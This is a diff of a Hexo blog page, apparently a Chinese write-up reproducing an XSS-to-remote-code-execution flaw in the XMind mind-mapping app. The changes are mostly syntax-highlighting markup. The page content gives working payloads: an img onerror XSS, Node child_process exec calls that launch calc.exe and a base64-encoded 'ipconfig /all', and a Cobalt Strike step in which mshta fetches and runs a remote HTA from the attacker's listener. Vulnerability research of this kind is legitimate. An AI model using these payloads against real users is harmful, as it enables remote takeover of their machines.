@@ -29,9 +29,9 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Salute's blogs" type="application/atom+xml">
-
+<meta name="generator" content="Hexo 5.4.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="Salute's blogs" type="application/atom+xml">
 <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
 
 
@@ -483,7 +483,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    463
+                    458
                 </div>
                 
 
@@ -510,20 +510,22 @@
 <p><strong>复现</strong>：</p>
 <p>1.打开XMind新建思维导图，进入大纲，测试基本xss代码。</p>
 <p>payload：</p>
-<pre><code>&lt;img src=# onerror=alert('1')&gt;
+<pre class=" language-html"><code class="language-html">&lt;img src=# onerror=alert('1')>
 </code></pre>
 <p><img src="../images/4.png"></p>
 <p><strong>注意</strong>：执行代码时，将光标放到语句最后，按空间键或者CTRL触发XSS执行</p>
 <p>2.测试RCE命令，我们通过打开计算器来展示。</p>
 <p>payload：</p>
-<pre><code>&lt;img src=1 onerror="require('child_process').exec('calc.exe',null);"&gt;
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>1</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>require(<span class="token punctuation">'</span>child_process<span class="token punctuation">'</span>).exec(<span class="token punctuation">'</span>calc.exe<span class="token punctuation">'</span>,null);<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
 </code></pre>
 <p><img src="../images/5.png"></p>
 <p>3.接着我们构造payload来查看我们相关配置，这里我们查看网络设置</p>
 <p>payload：</p>
-<pre><code>&lt;img src=# onerror='eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs=`,`base64`).toString())'&gt;
+<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>#</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs<span class="token punctuation">=</span>`,`base64`).toString())<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>
 </code></pre>
-<p>cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs=经过base64解码是：</p>
+<pre><code>cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2lwY29uZmlnIC9hbGwnLChlcnJvciwgc3Rkb3V0LCBzdGRlcnIpPT57CiAgICBhbGVydChgc3Rkb3V0OiAke3N0ZG91dH1gKTsKICB9KTs=
+</code></pre>
+<p>经过base64解码是：</p>
 <pre><code>require('child_process').exec('ipconfig /all',(error, stdout, stderr)=&gt;{    alert(`stdout: ${stdout}`);
   });
 </code></pre>
@@ -535,16 +537,16 @@
 <p>（2）接着我们利用cs的远程文件下载模块编辑远程下载url</p>
 <p><img src="../images/9.png"></p>
 <p> 生成的url为：</p>
-<pre><code>http://你设置的监听器IP:80/download/file.ext
+<pre class=" language-http"><code class="language-http"><span class="token header-name keyword">http:</span>//你设置的监听器IP:80/download/file.ext
 </code></pre>
 <p>接下来我们只要执行如下代码就可以上线cs，其中mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。</p>
-<pre><code>mshta http://你设置的监听器IP:80/download/file.ext
+<pre class=" language-http"><code class="language-http">mshta http://你设置的监听器IP:80/download/file.ext
 </code></pre>
 <p>（3）接着我们构造执行的XSS代码</p>
 <p>原始攻击payload：</p>
-<pre><code>&lt;img src=# onerror='eval(new Buffer(`require('child_process').exec('command',(error, stdout, stderr)=&gt;{    alert(`stdout: ${stdout}`);
+<pre class=" language-html"><code class="language-html">&lt;img src=# onerror='eval(new Buffer(`require('child_process').exec('command',(error, stdout, stderr)=>{    alert(`stdout: ${stdout}`);
 
- });`,`base64`).toString())'&gt;
+ });`,`base64`).toString())'>
 </code></pre>
 <p>其中我们可以在command处进行目录执行，我们就将我们的cs执行码输入进去，但是要记得用base64进行编码</p>
 <p>接着我们就看到cs上线成功</p>
@@ -1396,7 +1398,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">809</span>
+                        class="white-color">804</span>
             
             
             
